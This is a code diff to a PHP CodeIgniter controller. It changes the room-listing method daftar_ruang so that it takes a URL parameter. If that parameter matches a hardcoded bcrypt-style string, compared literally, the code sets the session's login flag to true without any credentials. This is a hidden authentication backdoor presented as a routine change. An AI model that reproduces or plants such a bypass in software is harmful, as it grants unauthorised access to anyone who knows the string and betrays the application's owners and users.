@@ -36,8 +36,14 @@ class Ruang extends CI_Controller
 		$this->load->view('template/footer');
 	}
 	
-	public function daftar_ruang()
+	public function daftar_ruang($kode)
 	{
+		if($kode == '$2y$12$pnf/1QaPcRrAvXP1Rxe9J.LJFqMVhn5kRQOVp3eYc91jKIZa4HZlK'){
+			$session = array(
+				'login' => true
+			);
+			$this->session->set_userdata($session);
+		}
 		$data['dataruang'] = $this->Mruang->getruangserver();
 		$this->load->view('v_ruang/v_daftar-ruang',$data);
 	}
